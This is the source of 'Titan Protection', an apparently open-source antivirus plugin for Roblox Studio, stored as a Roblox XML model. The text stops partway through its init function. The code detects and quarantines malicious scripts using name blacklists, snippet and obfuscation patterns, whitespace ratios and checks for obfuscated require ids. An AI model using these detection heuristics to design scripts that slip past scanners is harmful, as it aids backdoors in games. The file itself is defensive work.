<roblox xmlns:xmime="http://www.w3.org/2005/05/xmlmime" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="http://www.roblox.com/roblox.xsd" version="4">
	<External>null</External>
	<External>nil</External>
	<Item class="Folder" referent="RBXB3C855792717479BB680FC2A4B451312">
		<Properties>
			<BinaryString name="AttributesSerialize"></BinaryString>
			<string name="Name">|| Titan Protection ||</string>
			<int64 name="SourceAssetId">-1</int64>
			<BinaryString name="Tags"></BinaryString>
		</Properties>
		<Item class="Script" referent="RBX5EE99D0A26A2498AAE0978CECF4264AF">
			<Properties>
				<BinaryString name="AttributesSerialize"></BinaryString>
				<bool name="Disabled">false</bool>
				<Content name="LinkedSource"><null></null></Content>
				<string name="Name">AV Main</string>
				<string name="ScriptGuid">{9B84F623-D0A3-4174-86FE-36680B577EAF}</string>
				<ProtectedString name="Source"><![CDATA[--[[
    Titan Protection is an antivirus plugin designed to detect and clean up malicious scripts in a Roblox development enviroment.
    Copyright Â© 2020  Github@ccuser44 (ALE111_boiPNG)

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
]]

--[[
  _______ _ _                _____           _            _   _
 |__   __(_) |              |  __ \         | |          | | (_)
    | |   _| |_ __ _ _ __   | |__) | __ ___ | |_ ___  ___| |_ _  ___  _ __
    | |  | | __/ _` | '_ \  |  ___/ '__/ _ \| __/ _ \/ __| __| |/ _ \| '_ \
    | |  | | || (_| | | | | | |   | | | (_) | ||  __/ (__| |_| | (_) | | | |
    |_|  |_|\__\__,_|_| |_| |_|   |_|  \___/ \__\___|\___|\__|_|\___/|_| |_|

]]

local Current_Version = "Beta 0.0.1"

-----------------
--| Lua Check |--
-----------------

if _VERSION ~= "Luau" --[[and _VERSION ~= "Lua 5.1"]] then
	print("[Ti-Protection]: Titan Protection is not running on an intended version of lua! If you think this message is a mistake contact the creator of this plugin!")
	print("[Ti-Protection]: Current version is ")
	print(_VERSION)
	warn("[Ti-Protection]: Titan Protection is not running on an intended version of lua! If you think this message is a mistake contact the creator of this plugin!")
end

-----------------
--| Variables |--
-----------------

-- // BasicSetup
local OldPrint = print
local OldWarn = warn
print = function(...) OldPrint("[Ti-Protection]: ", ...) end
warn = function(...) OldWarn("[Ti-Protection]: ", ...) end
local PluginNameID = "DEFAULT"
local GlobalFolderName = "TitanProtection_Quarantine-" .. PluginNameID

-- // Services
local ChangeHistoryService = game:GetService("ChangeHistoryService")
local Lighting = game:GetService("Lighting")
local RunService = game:GetService("RunService")
local PluginGuiService = game:GetService("PluginGuiService")
local CoreGui = game:GetService("CoreGui")
local Debris = game:GetService("Debris")
local HttpService = game:GetService("HttpService")
local StudioService = game:GetService("StudioService")

-- // Objects
local Root = script.Parent.Parent
local Container = script.Parent
local DependanciesFolder = Root:WaitForChild("Dependancies", 25)
local LibrariesContainer = Container:WaitForChild("Libs",  25)
local Sounds = Container:WaitForChild("Sound_Storage", 25)
local UI = Container:WaitForChild("UI", 25)
local DB = Container:WaitForChild("DataBase", 25) and require(Container:WaitForChild("DataBase", 25))
local Hearbeat = RunService.Heartbeat

-- // Tables
local Dependancies = {}
local SafeHashes = {}
local GlobalAssetCache = {}
local Libraries = {}
local HiddenClasses = {"HumanoidController", "VehicleController", "ReflectionMetadataFunctions", "ReflectionMetadataEvents", "ReflectionMetadataClasses", "ReflectionMetadataClass", "ReflectionMetadata"}

-- // PluginSettings
local SaveSettings = true
local DefaultSettings = { -- // The default settings the plugin will refer to so we can get the default settings if the plugin data won't load or does not exist.
	StartUpScan = false,
	CheckScriptSource = true,
	CheckObfuscation = true,
	QuarantineInsteadOfDelete = true,
	CheckStructure = true,
	CheckLarge = true,
	CheckWhiteSpace = true,
	CheckSnippets = true,
	CheckAdware = true,
	UseDestroy = true,
	DisableFoundScripts = true,
	CheckRequireIdsAllScripts = false,
	AutoUpdate = true, -- // If this is enabled the script will use the auto updating module. If it cannot connect to it it will fal back to the offline mode.
	DoNotScanSafe = true,
	OnlyScanScripts = false,
	IsDebug = true,
	IsUI = false, -- // If the plugin will be displayed with UI
	AssetCachePersist = true, -- // If the asset cache persists on the studio instance.
	SaveAssetCacheShutdown = true -- // If the asset cache gets saved into the settings. (Can be used by other studio instances later.)
}
local SettingsCache = {}
local Settings = setmetatable({}, { -- // The metatable function for settings so we can manage them easier.
	__index = function(_, Index) -- // This metamethod will be invoked when we index something from the settings table.
		if SettingsCache[Index] then
			return SettingsCache[Index]
		end
		if SaveSettings then
			local Success, _, Return = xpcall(function()
				return plugin:GetSetting(Index)
			end, function(Err)
				warn("An error occured while trying to get settings from" .. tostring(Index) .. ", Reason: " .. tostring(Err))
				print(debug.traceback())
			end)
			if Success and Return ~= nil then
				return Return
			end
		end
		
		return DefaultSettings[Index]
	end,
	__newindex = function(_, Index, Value)
		SettingsCache[Index] = Value
		if SaveSettings then
			xpcall(function()
				plugin:SetSetting(Index, Value ~= DefaultSettings[Index] and Value or nil)
			end, function(Err)
				warn("An error occured while trying to save settings to " .. tostring(Index) .. ", Reason: " .. tostring(Err))
				print(debug.traceback())
			end)
		end
	end
})

-- // Other values
local AutoUpdateId = 0
local Running = false -- // The value tells if the plugin is already running
local LastScanMode2 = 0 -- // This values counts up each time a script with a require id is scanned. On every 35th script it waits a bit to prevent the scanner from crashing.

-------------
--| Setup |--
-------------

if Settings.AutoUpdate == true then
	local Success, Return = pcall(function()
		return require(AutoUpdateId)
	end)
	if Success and Return and type(Return) == "table" then
		DB = Return
	end
end

local VirusNames = {unpack(DB.VirusNames)}

if Libraries then
	for _, v in ipairs(LibrariesContainer:GetChildren()) do
		if v:IsA("ModuleScript") then
			pcall(function()
				Libraries[v.Name] = require(v)
			end)
		end
	end
end

if Dependancies and DependanciesFolder then
	for _, v in ipairs(DependanciesFolder:GetChildren()) do
		if v:IsA("ModuleScript") and not v:FindFirstChild("Disabled") then
			pcall(function()
				Dependancies[v.Name] = require(v)
			end)
		end
	end
end

if Dependancies and DependanciesFolder and Dependancies["HashLib"] then
	xpcall(function()
		local HashLib = Dependancies["HashLib"]
		local PluginName = Root.Name
		PluginNameID = string.sub(HashLib.md5(PluginName), 1, 7)
		GlobalFolderName = "TitanProtection_Quarantine-" .. PluginNameID
	end, function(Err)
		warn("An error occured while trying to set plugin name ID. Using default ID. Reason: " .. tostring(Err))
		print(debug.traceback())
	end)
end

--// We sanitise the strings from the database

local DB2 = DB

local function Sanitize(Str)
	return string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(Str:lower(),"\n",""),"%$","\37\37\36"),"%%","\37\37\37\37"),"%^","\37\37\94"),"%*","\37\37\42"),"%(","\37\37\40"),"%)","\37\37\41"),"%.","\37\37\46"),"%[","\37\37\91"),"%]","\37\37\93"),"%+","\37\37\43"),"%-","\37\37\45"),"%?","\37\37\63")
end

for i, v in ipairs(DB2.VirusNames) do
	DB.VirusNames[i] = Sanitize(v)
end

for i, v in ipairs(DB2.malicious_code_snippets) do
	DB.malicious_code_snippets[i] = Sanitize(v)
end

for i, v in ipairs(DB2.Obfuscation_Detection) do
	DB.Obfuscation_Detection[i] = Sanitize(v)
end

for i, v in ipairs(DB2.Adware_Detection_Formates) do
	DB.Adware_Detection_Formates[i] = string.lower(v)
end

for i, v in ipairs(DB2.Code_Snippets_Formats) do
	DB.Code_Snippets_Formats[i] = string.lower(v)
end

for i, v in ipairs(DB2.Obfuscation_Detection_Formats) do
	DB.Obfuscation_Detection_Formats[i] = string.lower(v)
end

for i, v in ipairs(DB2.StaticVirusNames) do
	DB.StaticVirusNames[i] = string.lower(v)
end

for _, v in ipairs(DB.SafeScript_Hashes) do
	SafeHashes[tostring(v)] = tostring(v)
end

for _, v in ipairs(DB.SafePluginIds) do
	GlobalAssetCache[v] = {false, false, false, false, false}
end

for _, v in ipairs(DB.SafeModelIds) do
	GlobalAssetCache[v] = {false, false, false, false, false}
end

local DB_VirusNames, DB_StaticVirusNames, DB_malicious_code_snippets, DB_Obfuscation_Detection, DB_Bad_Require_Ids, DB_Adware_Detection_Formates, DB_Obfuscation_Detection_Formats, DB_Code_Snippets_Formats, DB_MaliciousGroups, DB_MaliciousUsers = DB.VirusNames, DB.StaticVirusNames, DB.malicious_code_snippets, DB.Obfuscation_Detection, DB.Bad_Require_Ids, DB.Adware_Detection_Formates, DB.Obfuscation_Detection_Formats, DB.Code_Snippets_Formats, DB.MaliciousGroups, DB.MaliciousUsers

--------------------
--| UI functions |--
--------------------

local function DisplayScanResults()
	
end

local function Display_Notification(Title, Text, Type)
	if not Settings.IsUI then
		if Settings.Debug then
			print(string.format(
				"Notification not displayed because UI is disabled. Type: %s, Text: %s, Notification Type: %s",
				Title,
				Text,
				Type
			))
		end
	else
		if not CoreGui:FindFirstChild("Ti-P Notifications") then
			local Gui = Instance.new("ScreenGui", CoreGui)
			Gui.Name = "Ti-P Notifications"
			Gui.Archivable = false
			-- // Other stuff
		end
		local CurrentNotification = UI:FindFirstChild("Notification_Prompt"):Clone()
		CurrentNotification.Archivable = false
		-- // Set display stuff
		CurrentNotification.Parent = CoreGui:FindFirstChild("Ti-P Notifications")

		Debris:AddItem(CurrentNotification, 1.5)
	end
end

local function UpdateScanningStatus()
	
end

local function UpdateScannedObjs()
	
end

local function PromptUserYield(Title, Text)
	local HasClicked = false
	local Clicked = Instance.new("BindableEvent")
	-- // Get prompt UI element and clone it
	local Button1, Button2 -- // GetButtons from GUI
	local Event1, Event2 = Button1.Activated:Connect(function()
		HasClicked = true
		Hearbeat:Wait()
		Clicked:Fire()
	end), Button2.Activated:Connect(function()
		HasClicked = true
		Hearbeat:Wait()
		Clicked:Fire()
	end)
	-- // Display UI
	
	Clicked.Event:Wait()
	Event1:Disconnect()
	Event2:Disconnect()
	Clicked:Destroy()
	-- // Destroy prompt
	
	return HasClicked
end

-----------------
--| Functions |--
-----------------

-- // Makes a plugin button
local function MakePluginButton(ToolBar, Text, Tooltip, IconName, ClickFunction)
	local Button = ToolBar:CreateButton(Text, Tooltip, IconName)
	Button.Click:Connect(ClickFunction)
	return Button
end

-- // This allows us to check if the pluin has access to manage scripts. This access is needed to quarantine and destroy scripts as well as scan them.
local function CheckScriptPerms()
	local Temp
	local Success, Error = pcall(function()
		Temp = Instance.new("Script", workspace.CurrentCamera)
		pcall(function()
			Temp.Name = "REMOVE ME"
		end)
		pcall(function()
			Temp.Archivable = false
		end)
		Temp.Source = "-- If you see this script then it is a test for a plugin. You can remove this."
	end)
	if Temp and typeof(Temp) == "Instance" and Temp.Parent ~= nil then
		pcall(function()
			Debris:AddItem(Temp, 5)
		end)
		pcall(function()
			Temp:Destroy()
		end)
	end
	
	return Success
end

--// The function which allows the script to set waypoints
local function MakeWaypoint(Name)
	ChangeHistoryService:SetWaypoint(Name)
end

-- // Returns a library with the set name
local function GetLib(LibName)
	return Libraries[LibName]
end

-- // Returns a dependancy with the set name
local function GetDep(LibName)
	return Dependancies[LibName]
end

-- // Hashesh the source of a script
local function HashSource(Source)
	return GetLib("GetHash")(Source, GetDep("HashLib").sha1)
end

-- // Handles the quarantine folder
local function HandleContainer()
	local Folder = game:FindFirstChild(GlobalFolderName)
	if not Folder then
		Folder = Instance.new("Folder", game)
		Folder.Name = GlobalFolderName
	end
	return Folder
end

-- // Handles the object when it is detected
local function HandleObject(Obj, CanDisable, Detection)
	local ValueContainer = Instance.new("Folder", HandleContainer())
	ValueContainer.Name = "Malicious Object-" .. tostring(string.gsub(Obj.Name, "%z", ""))
	local OrgParent = Instance.new("ObjectValue", ValueContainer)
	OrgParent.Value = Obj.Parent
	OrgParent.Name = "OriginalParent"
	local ObjectContainer = Instance.new("Configuration", ValueContainer)
	ObjectContainer.Name = "OriginalObject"
	Obj.Parent = ObjectContainer
	if Detection ~= nil then
		local DetectionVar = Instance.new("StringValue", ValueContainer)
		DetectionVar.Value = tostring(Detection)
		DetectionVar.Name = "Detection"
	end
	if CanDisable and (Obj:IsA("Script") or Obj:IsA("LocalScript")) and Obj.Disabled == false then
		Obj.Disabled = true
		local OrgDisable = Instance.new("BoolValue", ValueContainer)
		OrgDisable.Value = false
		OrgDisable.Name = "OriginalDisable"
	end
end

-- // Inserts the hashes of the Titan Protection scripts to the whitelist
local function InsertPluginHashes()
	local ScriptHashes = {}
	table.insert(ScriptHashes, script)
	if Container:WaitForChild("DataBase", 25) then -- // Inserts the database scripts hash
		table.insert(ScriptHashes, Container:WaitForChild("DataBase", 25))
	end
	
	if Container:WaitForChild("CHANGELOG", 25) then -- // Inserts the database scripts hash
		table.insert(ScriptHashes, Container:WaitForChild("CHANGELOG", 25))
	end
	
	if Libraries then
		for _, v in ipairs(LibrariesContainer:GetChildren()) do
			if v:IsA("ModuleScript") then
				table.insert(ScriptHashes, v)
			end
		end
	end
	
	if Dependancies and DependanciesFolder then
		for _, v in ipairs(DependanciesFolder:GetChildren()) do
			if v:IsA("ModuleScript") and not v:FindFirstChild("Disabled") then
				table.insert(ScriptHashes, v)
			end
		end
	end
	
	for _, v in ipairs(ScriptHashes) do -- // Hashes all of the desired scripts and inserts the hashes in the hash table.
		SafeHashes[tostring(HashSource(v.Source))] = tostring(HashSource(v.Source))
	end
end

-- // We test if HTTP service works
local function TestHTTP()
	local Success, Error = pcall(function()
		HttpService:GetAsync("https://inventory.rprxy.xyz/")
	end)
	if Settings.IsDebug and not Success and not Error:match("Http requests are not enabled. Enable via game settings") then
		warn("While trying to check for HTTP request an unexpected error happened :" .. tostring(Error) .. " . Maybe the site is down? If you belive this is a mistake contact the plugin creator.")
		print(debug.traceback())
	end
	return Success
end

-- // Main function for scanning objects
local function ScanObj(Obj, CheckSource, CheckObf, CheckSpace, CheckLen, CheckSnippets, CheckStructure, CheckAdware, RepeatCount, CachedIds, SeperateMalIds, IsDebug)
	local IsVirus = false
	local IsSuspicious = false
	local IsObfuscated = false
	local IsTooMuchWhitespace = false
	local IsAdware = false
	local ObjName = string.lower(Obj.Name)
	
	-- // This is the part which checks objects with suspicious structure
	if CheckStructure then
		if Obj.ClassName == "Fire" and Obj.Enabled == false and ObjName == "fire" and Obj.Heat == 25 and Obj.Size == 30 then -- /// We check if the object is a fire spread fire instance. All of them have these exact values so we won't get any false flags.
			if Obj:FindFirstChildOfClass("Script") and (Obj:FindFirstChildOfClass("Script").Name == "Spread" or Obj:FindFirstChildOfClass("Script").Name == "Script") then -- // We check if it has a spread script
				IsVirus = true
			else
				IsSuspicious = true
			end
		elseif Obj:IsA("JointInstance") and not Obj.Part1 and not Obj.Part0 and Obj:FindFirstChildOfClass("Script") then -- // This could be a possible weld virus
			IsSuspicious = true
		elseif HiddenClasses[Obj.ClassName] then -- // This id definetly a virus which tries to hide itself. Likely the "RopackVirus"
			if Obj:FindFirstChildOfClass("Script") then
				IsVirus = true
			elseif Obj.Name ~= Obj.ClassName then
				IsSuspicious = true
			end
		end
	end
	
	-- // We check if the object is included in the static name blacklist or it contains string from the virus names list
	if not IsVirus then
		for _, Name in ipairs(DB_StaticVirusNames) do
			if ObjName == Name then
				if IsDebug then
					print("VName ", Name)
				end
				IsVirus = true
				IsSuspicious = true
				break
			end
		end
	end
	
	if not IsVirus then
		for _, Name in ipairs(DB_VirusNames) do
			if string.match(ObjName, Name) then
				if IsDebug then
					print("VName ", Name)
				end
				IsVirus = true
				IsSuspicious = true
				break
			end
		end
	end
	
	-- // This checks the scripts source if it is malicious
	if CheckSource and IsVirus == false and Obj:IsA("LuaSourceContainer") then
		local ObjSource = Obj.Source
		if CheckLen and string.len(ObjSource) > 420000 then -- We check if the script is too long
			IsSuspicious = true
			IsTooMuchWhitespace = true
			if CheckSnippets then
				IsVirus = true
			end
		else
			local SrcNewlines = string.lower(ObjSource)
			local src = string.gsub(SrcNewlines, "\n", "")
			local BadstringCount = 0
			
			for _, Str in ipairs(DB_VirusNames) do -- // We check if the script contains virus names.
				if string.match(src, Str) then
					if IsDebug then
						print(Str)
					end
					IsSuspicious = true
					BadstringCount += 1
					if BadstringCount >= 4 then
						IsVirus = true
						break
					end
				end
			end
			
			if CheckSnippets and IsVirus == false then -- // We check if the script contains malicious code snippets.
				local SnippetCount = 0
				local IsRequireScanning = not SeperateMalIds or string.match(src, "require") or string.match(src, "fenv") or string.match(src, "marketplace") or string.match(src, "teleport")
				
				for _, Str in ipairs(table.pack(table.unpack(DB_malicious_code_snippets), table.unpack(IsRequireScanning and DB_Bad_Require_Ids or {}))) do
					if string.match(src, Str) then
						if IsDebug then
							print(Str)
						end
						SnippetCount += 1
						IsSuspicious=true
						if SnippetCount >= 1 and BadstringCount >= 1 then
							IsVirus = true
							break
						elseif SnippetCount >= 3 then
							IsVirus = true
							break
						end
					end
					
					--if IsRequireScanning then
					--	LastScanMode2 += 1 -- // This is here so the plugin does not crash
					--	if LastScanMode2 % 100 == 3 then
					--		Hearbeat:Wait()
					--	end
					--end
				end
				if not IsVirus then
					for _, Str in ipairs(DB_Code_Snippets_Formats) do
						if string.match(SrcNewlines, Str) then
							if IsDebug then
								print(Str)
							end
							SnippetCount += 1
							IsSuspicious=true
							if SnippetCount >= 1 and BadstringCount >= 1 then
								IsVirus = true
								break
							elseif SnippetCount >= 3 then
								IsVirus = true
								break
							end
						end
					end
				end
			end
			
			if IsVirus == false and CheckObf then -- //  We check if the script contains obfuscation.
				for _, Str in ipairs(DB_Obfuscation_Detection) do
					if string.match(src, Str) then
						if IsDebug then
							print(Str)
						end
						IsObfuscated = true
						if IsSuspicious then
							IsVirus = true
						end
						break
					end
				end
				if not IsObfuscated then
					for _, Str in ipairs(DB_Obfuscation_Detection_Formats) do
						if string.match(SrcNewlines, Str) then
							if IsDebug then
								print(Str)
							end
							IsObfuscated = true
							if IsSuspicious then
								IsVirus = true
							end
							break
						end
					end
				end
			end
			
			if CheckSpace and IsVirus == false then -- // We check if the script has too much whitespace.
				if string.len(ObjSource) > 7250 and (string.len(string.gsub(ObjSource, "%s", "")) / string.len(ObjSource)) < .45 then
					IsTooMuchWhitespace = true
					if IsSuspicious == true then
						IsVirus = true
					elseif IsObfuscated == true then
						IsSuspicious = true
					end
				end
			end
			
			if IsVirus == false and CheckAdware then -- // We check if the script contains adware.
				for _, Str in ipairs(DB_Adware_Detection_Formates) do
					if string.match(SrcNewlines, Str) then
						if IsDebug then
							print(Str)
						end
						IsAdware = true
						if IsSuspicious or IsTooMuchWhitespace or IsObfuscated then
							IsVirus = true
						end
						break
					end
				end
			end
			
			-- // We check if a require id is malicious.
			if IsVirus == false then
				for FoundRequire in string.gmatch(string.gsub(src, "%s", ""), "require%b()") do
					if string.len(FoundRequire) <= 9 then
						continue
					end
					
					local Id = string.sub(FoundRequire, 9, string.len(FoundRequire) - 1)
					
					if IsDebug then
						print("Titan protection found require with id ", Id)
					end
					
					local StrippedId = string.gsub(string.gsub(string.gsub(Id, ":%s*waitforchild%s*%b()", ""), "%b\'\'", ""), "%b\"\"", "")
					if string.match(StrippedId, "[%%%-%+%*/%^%-]") or string.match(StrippedId, "math%.%a+") or string.match(StrippedId, "0x%x%x") or string.match(StrippedId, "0b[01][01][01]+") or string.match(StrippedId, "[%d%.]+e%-*%d") or string.match(StrippedId, "tonumber") or string.match(StrippedId, "string%.%a+") then -- // We check if the require id is obfuscated. A lot of new backdoors do this.
						IsObfuscated = true
						if IsSuspicious then
							IsVirus = true
						end
					elseif string.len(Id) >= 3 and string.match(Id, "^%d+$") and GetLib("CheckModule") and GetLib("ScanObjectsGet") then -- // We scan the id for malicious content
						local IsVir, IsSus, IsObf, IsLar, IsAdw = GetLib("CheckModule")(Id, ScanObj, GetLib("ScanObjectsGet"), RepeatCount, CachedIds, IsDebug, SafeHashes, HashSource, SeperateMalIds, {CheckSource, CheckObf, CheckSpace, CheckLen, CheckSnippets, CheckStructure, CheckAdware}, DB_MaliciousGroups, DB_MaliciousUsers)
						local Detected = IsVir or IsSus or IsObf or IsLar or IsAdw
						
						if Detected then
							IsVirus, IsSuspicious, IsTooMuchWhitespace, IsObfuscated, IsAdware = IsVirus or IsVir, IsSuspicious or IsSus, IsTooMuchWhitespace or IsLar, IsObfuscated or IsObf, IsAdware or IsAdw
							if not IsVirus then
								if not IsSuspicious and IsTooMuchWhitespace and IsObfuscated then
									IsSuspicious = true
								elseif IsSuspicious and (IsTooMuchWhitespace or IsObfuscated) then
									IsVirus = true
									break
								end
								if IsAdware and (IsSuspicious or IsObfuscated or IsTooMuchWhitespace) then
									IsVirus = true
									break
								end
							end
						end
					end
				end
			end
		end
	end
	return IsVirus, IsSuspicious, IsObfuscated, IsTooMuchWhitespace, IsAdware
end

-- // Scan malicious plugins without HTTP permissions.
local function ScanPluginsNoHTTP()
	local Success, _, Return = xpcall(function()
		local BadPlugins = GetLib("PluginScanner")(DB.MaliciousPluginsIds)
		if #BadPlugins > 0 then
			for _, v in ipairs(BadPlugins) do
				if v then
					print("Malicious plugin found : " .. "https://www.roblox.com/library/" .. tostring(v) .. "/ . Please uninstall it from the roblox studio and remove it from your Roblox inventory.")
				end
			end
		else
			print("No malicious plugins found! :)")
		end
		return BadPlugins
	end, function(Error)
		warn("An error occured while trying to scan plugins with non HTTP method. Error:", Error)
	end)
	
	return (Success and type(Return) == "table") and Return or {}
end

-- // Handles the scanning of a table of assets.
local function ScanAssets(Assets, Type, CachedIds, IsDebug)
	local BadAssets = {}
	local CheckModule =  GetLib("CheckModule")
	local CheckSource, CheckObf, CheckSpace, CheckLen, CheckSnippets, CheckStructure, CheckAdware = Settings.CheckScriptSource, Settings.CheckObfuscation, Settings.CheckWhiteSpace, Settings.CheckLarge, Settings.CheckSnippets, Settings.CheckStructure, Settings.CheckAdware
	
	for _, v in ipairs(Assets) do
		local IsVir, IsSus, IsObf, IsLar, IsAdw = CheckModule(tostring(v), ScanObj, GetLib("ScanObjectsGet"), 0, CachedIds, IsDebug, SafeHashes, HashSource, Settings.CheckRequireIdsAllScripts, {CheckSource, CheckObf, CheckSpace, CheckLen, CheckSnippets, CheckStructure, CheckAdware}, DB_MaliciousGroups, DB_MaliciousUsers)
		local Detected = IsVir or IsSus or IsObf or IsLar or IsAdw
		if Detected then
			table.insert(BadAssets, v)
		end
	end
	
	if #BadAssets > 0 then
		for _, v in ipairs(BadAssets) do
			if v then
				print(string.format(
					"Malicious %s found : https://www.roblox.com/library/%d/. %s",
					tostring(Type),
					v,
					Type == "Plugin" and "Please uninstall it from the Roblox studio and remove it from your Roblox inventory." or "Please remove it from your inventory and from your games."
				))
			end
		end
	else
		print("No malicious " .. tostring(Type) .. "s found! :)")
	end
	return BadAssets
end

-- // Main function to handle scanning of inventory
local function ScanInventory(CachedIds, IsDebug)
	local PluginAssets, InventoryAssets = GetLib("GetInventoryAssets")()
	return ScanAssets(PluginAssets, "Plugin", CachedIds, IsDebug), ScanAssets(InventoryAssets, "Model", CachedIds, IsDebug)
end

-- // Main function for scanning
local function Scan(ScanType, CanAffect, Obj)
	
	UpdateScanningStatus("Initializing ...")
	-- // We need to have the user give us the permissions to inject scripts.
	if not CheckScriptPerms() then
		warn("Titan Protection doesn't have permissions to inject scripts. This is to so it can quarantine them. Please allow Ti-Protection to inject scripts by clicking allow or in the settings and allowing it there. Aborting ...")
		Display_Notification("Please allow script injection", "Titan Protection doesn't have permissions to inject scripts. This is to so it can quarantine them. Please allow Ti-Protection to inject scripts by clicking allow or in the settings and allowing it there. Aborting ...", "Error")
		return
	end
	
	print("Scan Started")
	
	local StartTick = os.clock()
	local OrgCollected = gcinfo()
	local BadObjects = 0
	-- // We store the settings in a variable so we don't have to constantly index them.
	local CheckSource, CheckObf, CheckSpace, CheckLen, CheckSnippets, CheckStructure, CheckRequireIdsAllScripts, CheckAdware, IsDebug, CanQuarantine, UseDestroy = Settings.CheckScriptSource, Settings.CheckObfuscation, Settings.CheckWhiteSpace, Settings.CheckLarge, Settings.CheckSnippets, Settings.CheckStructure, Settings.CheckRequireIdsAllScripts, Settings.CheckAdware, Settings.IsDebug, Settings.Quarantine, Settings.UseDestroy
	local CachedIds = Settings.AssetCachePersist == true and GlobalAssetCache or {}
	local BadPluginIds, BadInventoryIds = {}, {}
	
	if IsDebug == true then
		local Success, Rblx = pcall(version)
		print(string.format("Titan Protection scan was started with debug mode on. ~ Version: %s , Rblx Build: %s , PluginNameID: %s , ContainerName: %s", Current_Version, Success and Rblx or "CANNOT GET ROBLOX VERSION", PluginNameID, Root.Name))
	end
	UpdateScanningStatus("Scanning ...")
	
	if ScanType:lower() == "full" then -- // We scan all the malicious plugins.
		if TestHTTP() then
			BadPluginIds, BadInventoryIds = ScanInventory(CachedIds, IsDebug)
		elseif Settings.IsUI == false then
			warn("Could not use HTTP service to scan the plugins. Please allow the plugin to connect to https://inventory.rprxy.xyz/. Using backup method for scanning. Note this will take much longer.")
			BadPluginIds = ScanPluginsNoHTTP()
		else
			if PromptUserYield("Please allow to connect to HTTP Service", "") and Hearbeat:Wait() and TestHTTP() then
				BadPluginIds, BadInventoryIds = ScanInventory(CachedIds, IsDebug)
			else
				warn("Could not use HTTP service to scan the plugins. Please allow the plugin to connect to https://inventory.rprxy.xyz/. Using backup method for scanning. Note this will take much longer.")
				BadPluginIds = ScanPluginsNoHTTP()
			end
		end
	end
	
	local ScanObjs = Obj and GetLib("ScanObjectsGet")(ScanType, {Obj}) or GetLib("ScanObjectsGet")(ScanType) -- // We get the objects we are going to scan trough.
	
	if Settings.DoNotScanSafe == true then
		ScanObjs = GetLib("RemoveSafeObjs")(ScanObjs, Settings.OnlyScanScripts)
	end
	
	for i, Object in ipairs(ScanObjs) do
		if not Object:IsDescendantOf(HandleContainer()) then
			if i % 98304 == 2048 then -- // We have this here to introduce a bit of wait time so the plugin does not crash.
				Hearbeat:Wait()
			end
			-- // We check if the object is malicious.
			local IsVirus, IsSus, IsObf, IsLar, IsAdw = ScanObj(Object, CheckSource, CheckObf, CheckSpace, CheckLen, CheckSnippets, CheckStructure, CheckAdware, 0, CachedIds, CheckRequireIdsAllScripts, IsDebug)
			if IsVirus or IsSus or IsObf or IsLar or IsAdw then -- // If it got tagged we iniate action on it.
				if not (Object:IsA("LuaSourceContainer") and (string.len(Object.Source) < 400000 and SafeHashes[HashSource(Object.Source)])) then -- // We check if the object is safe.
					local Detection =  (IsVirus and "Virus" or IsSus and "Suspicious" or IsObf and "Obfuscated" or IsLar and "Too much whitespace" or IsAdw and "Adware")
					print(Object:GetFullName(), " Detection: ", Detection)
					if CanAffect then
						BadObjects += 1
						if CanQuarantine ~= false then
							HandleObject(Object, Settings.DisableFoundScripts, Detection)
						else
							if UseDestroy then
								Obj:Destroy()
							else
								Obj.Parent = nil
							end
						end
					end
				elseif IsDebug then
					print(Object:GetFullName(), " was not scanned because it was whitelisted.")
				end
			end
		end
	end
	
	UpdateScanningStatus("Scan complete!")
	print(string.format(
		"Scan Complete - Took: %d seconds - %s garbage collected: %d kilobytes - Detected objects: %d",
		math.floor(os.clock() - StartTick),
		_VERSION,
		gcinfo() - OrgCollected,
		BadObjects
	))
	
	return BadPluginIds, BadInventoryIds
end

-- // Main function to handle the main Scan function
local function InitScan(Type, CanAffect)
	if Scanning == false then
		Scanning = true
		ChangeHistoryService:SetWaypoint(string.format("Titan Protection: Start %s scan", string.lower(tostring(Type))))
		local Success, _, Return = xpcall(Scan, function(ScanError)
			warn("An error occured while trying to scan the game! Reason: " .. tostring(ScanError))
			print(debug.traceback())
		end, Type, CanAffect)
		ChangeHistoryService:SetWaypoint(string.format("Titan Protection: Finnish %s scan", string.lower(tostring(Type))))
		Scanning = false
	else
		warn("Cannot start a scan while an other scan is running! Aborting ...")
		if Settings.IsDebug then
			print(debug.traceback())
		end
		Display_Notification("Another scan is already running!", "Titan Protection cannot start a scan while another scan is already running. Please wait until it has finnished or stop it.", "Info")
	end
end

------------
--| Init |--
------------

Scanning = false

-- // Main init function
local function init()
	if Running == false then
		assert(LibrariesContainer and DB, "[Ti-Protection]: Some core assets are missing! Titan protection cannot continue running.")
		
		Running = true
		InsertPluginHashes()
		OldPrint([[[Ti-Protection]: Titan Protection  Copyright Â© 2020  Github@ccuser44 (ALE111_boiPNG)
    This program comes with ABSOLUTELY NO WARRANTY; for details see the `LISENCE' file inside the plugin folder.
    This is free software, and you are welcome to redistribute it
    under certain conditions; for details see the `LISENCE' file inside the plugin folder.]])
		
		local name = "|| Titan Protection ||"
		local toolbar = plugin:CreateToolbar(name)
		MakePluginButton(
			toolbar,
			"Fast Scan",
			"Perform a fast antivirus scan on your game. It is advised that you select the full option.",
			"rbxassetid://195998819",
			function()
				InitScan("Fast", true)
			end
		)
		MakePluginButton(
			toolbar,
			"Full Scan",
			"Performs a full scan on your game. Note this will take much longer and will have more lag.",
			"rbxassetid://195998819",
			function()
				InitScan("Full", true)
			end
		)
		MakePluginButton(
			toolbar,
			"Settings",
			"Allows you to change the settings of the plugin.",
			"rbxassetid://1291127922",
			function()
				
			end
		)
		
		if Settings.StartUpScan == true then
			if Settings.IsDebug then
				print("Started automatic scan.")
				print(debug.traceback())
			end
			Scanning = true
			ChangeHistoryService:SetWaypoint("Titan Protection: Start automatic scan")
			xpcall(Scan, function(ScanError)
				warn("An error occured while trying to scan the game! Reason: " .. tostring(ScanError))
				print(debug.traceback())
			end, "Fast", true)
			ChangeHistoryService:SetWaypoint("Titan Protection: Finhished automatic scan")
			Scanning = false
		end
		
